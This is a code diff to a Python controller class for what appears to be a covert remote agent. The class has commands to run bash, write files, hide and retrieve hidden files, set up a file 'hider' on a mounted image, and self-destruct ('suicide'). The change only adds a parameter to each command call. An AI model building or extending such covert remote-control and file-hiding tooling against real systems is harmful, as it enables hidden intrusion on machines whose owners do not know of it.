@@ -29,7 +29,7 @@ class Agent:
         return Agent(conn, "spy")
 
     def run_bash(self, bash: str) -> tuple[Responce, str]:
-        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, bash))
+        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, 0, bash))
         return self.conn.recv_full_responce()
 
     """
@@ -53,7 +53,7 @@ class Agent:
             fileContent = file.read()
 
         self.conn.send_command(
-            Command(ic(len(fileContent)), FunCode.WRITE_FILE, 0, targetFileName)
+            Command(ic(len(fileContent)), FunCode.WRITE_FILE, 0, 1, targetFileName)
         )
         self.conn.send_data(fileContent)
         return self.conn.recv_responce_struct()
@@ -63,6 +63,7 @@ class Agent:
             Command(
                 0,
                 FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
+                0,
                 0,
                 fileName,
             )
@@ -74,7 +75,7 @@ class Agent:
     def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
         assert FunCode.HIDDEN_UPLOAD not in fncode
 
-        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
+        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, 1, ""))
         results = list()
         results.append(self.conn.recv_bytes(Status.sizeof))
         results.append(self.conn.recv_bytes(Status.sizeof))
@@ -94,6 +95,7 @@ class Agent:
                 len(fileContent),
                 FunCode.HIDDEN_OPRATION | fncode,
                 0,
+                1,
                 targetFileName,
             )
         )
@@ -107,10 +109,10 @@ class Agent:
     # prob redundant in future
     def hider_setup(self, hiderPath: str, imagePath: str, mountPath: str) -> Responce:
         self.mountPath = mountPath
+        strParam = hiderPath + ";" + imagePath + ";" + mountPath
+        self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, 0, strParam))
         self.hiding_env_setup(imagePath)
 
-        strParam = hiderPath + ";" + imagePath + ";" + mountPath
-        self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
         return self.conn.recv_responce_struct()
 
     def hiding_env_setup(self, imagePath: str):
@@ -136,13 +138,13 @@ class Agent:
 
     def suicide(self):
         self.unmountFS()
-        self.conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
+        self.conn.send_command(Command(0, FunCode.SUICIDE, 0, 0, ""))
         res = self.conn.recv_responce_struct()
         assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
         return res
 
     def runContraption(self, params: ContParams, identifier: int):
-        self.conn.send_command(Command(0, FunCode.RunContraption, identifier, ""))
+        self.conn.send_command(Command(0, FunCode.RunContraption, identifier, 0, ""))
         self.conn.send_data(bytes(params))
         res = self.conn.recv_responce_struct()
         return res
